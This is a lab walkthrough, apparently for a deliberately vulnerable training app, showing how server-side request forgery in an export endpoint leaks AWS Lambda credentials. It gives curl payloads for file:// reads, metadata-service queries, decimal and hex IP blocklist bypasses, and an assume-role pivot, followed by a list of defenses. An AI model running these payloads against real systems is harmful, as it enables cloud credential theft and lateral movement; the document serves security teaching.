🔓 Cloud SSRF → AWS Credential Theft
Full walkthrough · commands · defenses
SSRF IMDSv1/v2 Lambda IAM file://

Objective

The /api/export endpoint fetches an attacker-controlled template_url server-side with no validation. This is a classic Server-Side Request Forgery (SSRF). Goal: pivot from "fetch a template" into leaking the Lambda execution role's AWS credentials — then use them with the AWS CLI.

Why it matters: In cloud, SSRF is rarely "just" an internal port scan. The instance/Lambda metadata service hands out temporary IAM credentials to anything that can reach it. One unvalidated fetch = full credential compromise = lateral movement.

Attack Path (Steps 1-6)

Step 1: Confirm the SSRF sink

Go to Report Export, select Custom URL as template source. Enter an internal URL to confirm server-side fetch.

curl "http://localhost:5026/api/export?template_url=http://localhost/"

Step 2: Read Lambda environment via file://

file:///proc/self/environ leaks all env vars including AWS creds.

curl "http://localhost:5026/api/export?template_url=file:///proc/self/environ"

Note: Variables are NUL-separated in the raw file.

Step 3: Hit the metadata service (IMDSv1)

The metadata endpoint is at 169.254.169.254.

# 1) list the attached role
curl "http://localhost:5026/api/export?template_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 2) fetch that role's temporary creds  
curl "http://localhost:5026/api/export?template_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/pea-portal-lambda-role"

Step 4: Bypass a weak blocklist

HARDENED mode blocks literal '169.254.169.254'. Use decimal encoding.
169.254.169.254 in decimal = 2852039166

# decimal-encoded metadata IP bypasses naive string filter
curl "http://localhost:5026/api/export?template_url=http://2852039166/latest/meta-data/iam/security-credentials/pea-portal-lambda-role"

# hex-encoded also works
curl "http://localhost:5026/api/export?template_url=http://0xa9fea9fe/latest/meta-data/iam/security-credentials/pea-portal-lambda-role"

This is why allowlists beat blocklists.

Step 5: Parse & weaponize the credentials

export AWS_ACCESS_KEY_ID=ASIAXYKJVV3XAMCKCAIG
export AWS_SECRET_ACCESS_KEY=Bl1FnI+DGg89kMBh4UF1XmdmZfO3DqkPzdZ989fH
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEDkaCXVzLWVhc3Qt1ABCDEFGHIJKLMNOPQRSTUVWXYZ123
export AWS_DEFAULT_REGION=us-east-1
aws sts get-caller-identity

Step 6: Pivot — assume the backend role

The Lambda env leaked BACKEND_ROLE_ARN (DataScientistRole).

aws sts assume-role --role-arn arn:aws:iam::533267328750:role/DataScientistRole --role-session-name pea-pivot

Defenses

  • Allowlist outbound template hosts
  • Enforce IMDSv2 (token + hop-limit 1)
  • Block file:// scheme and link-local ranges
  • Apply least-privilege IAM
  • Log & alert on metadata access
Flip to GUARDRAILED and re-run every payload — each attempt is denied and logged.
